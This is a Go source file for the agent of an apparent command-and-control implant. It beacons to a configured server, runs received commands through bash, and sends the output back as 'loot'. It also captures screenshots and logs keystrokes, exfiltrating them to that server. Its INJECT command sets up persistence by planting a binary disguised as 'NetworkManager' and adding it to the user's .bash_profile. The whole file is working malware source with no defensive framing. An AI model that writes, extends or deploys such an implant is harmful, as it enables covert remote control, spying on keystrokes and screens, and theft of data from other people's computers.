package agent

import (
	"bytes"
	"fmt"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/hardal7/pex/internal/config"
)

func Serve() {
	ch := make(chan string)
	for {
		makeRequest(ch)
		time.Sleep(time.Duration(config.Interval+(config.Jitter*rand.IntN(1))) * time.Second)
	}
}

type Loot struct {
	kind    string
	content string
}

var username string
var isLoggingKeys bool

func makeRequest(ch chan string) {
	requestURL := "http://" + config.Host + ":" + config.Port
	request, _ := http.NewRequest("GET", requestURL, nil)
	username := getUsername()
	request.Header.Set("Username", username)
	go readKeys(*request, ch)

	response, err := http.DefaultClient.Do(request)
	if err != nil {
		slog.Info("Failed to send request to server: " + err.Error())
		return
	} else {
		slog.Info("Sent request to server")
	}

	body, _ := io.ReadAll(response.Body)
	command := strings.Fields(string(body[:]))
	loot := runCommand(command, ch)

	slog.Info("Sending loot to server")
	if loot.kind == "Image" {
		buffer, _ := os.ReadFile(loot.content)
		_, err = http.Post(requestURL, "image/png", bytes.NewBuffer(buffer))
	} else {
		_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(loot.content)))
	}
	if err != nil {
		slog.Info("Failed sending loot to server: " + err.Error())
	} else {
		slog.Info("Sent loot to server")
	}
}

func getUsername() string {
	if username == "" {
		slog.Info("Getting username")
		username = executeCommand([]string{"whoami"})
	}
	return strings.TrimSpace(username)
}

func executeCommand(command []string) string {
	var stdout bytes.Buffer
	var stderr bytes.Buffer

	var commandExists bool = false
	var cmd *exec.Cmd
	if len(command) != 0 {
		command = append([]string{"-c"}, strings.Join(command, " "))
		cmd = exec.Command("bash", command...)
		commandExists = true
	}

	if commandExists {
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			slog.Error("Failed executing command: " + err.Error())
			fmt.Println(command)
		}
		slog.Info("Executed command")

	}
	slog.Info("Output:\n" + stdout.String())
	if stderr.String() != "" {
		slog.Info("Error Output: " + stderr.String())
	}

	return stdout.String() + stderr.String()
}

func runCommand(command []string, ch chan string) Loot {
	var loot Loot
	switch command[0] {
	case "INJECT":
		loot.content = executeCommand([]string{"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"})
	case "LOGKEYS":
		isLoggingKeys = true
		go LogKeyboard(ch)
	case "SCREEN":
		screenshots := CaptureScreen()
		loot.kind = "Image"
		// TODO: Send more than 1 screenshot for multiple monitor setups
		loot.content = screenshots[0]
	default:
		slog.Info("Executing command: " + command[0])
		loot.content = executeCommand(command)
	}

	return loot
}

func readKeys(request http.Request, ch chan string) {
	if isLoggingKeys {
		keys := <-ch
		if len(keys) != 0 {
			request.Header.Set("Keys", keys)
			keys = ""
			http.DefaultClient.Do(&request)
		}
	}
}
